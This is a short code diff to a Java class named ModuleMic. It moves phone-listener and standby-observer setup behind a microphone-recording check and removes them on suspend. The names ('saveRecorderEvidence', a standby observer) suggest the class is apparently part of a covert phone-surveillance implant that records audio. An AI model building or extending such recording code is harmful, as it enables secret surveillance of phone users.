@@ -136,12 +136,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				standbyObserver = new StandByObserver(this);
 			}
 
-			addPhoneListener();
-			if (Cfg.DEBUG) {
-				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
-			}
-			ListenerStandby.self().attach(standbyObserver);
+
 			if (canRecordMic()) {
+				addPhoneListener();
+				if (Cfg.DEBUG) {
+					Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
+				}
+				ListenerStandby.self().attach(standbyObserver);
 				startRecorder();
 			}
 
@@ -622,7 +623,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			super.suspend();
 			saveRecorderEvidence();
 			stopRecorder();
-
+			if (allowResume == false) {
+				removePhoneListener();
+				ListenerStandby.self().detach(standbyObserver);
+			}
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (suspended)");//$NON-NLS-1$
 			}
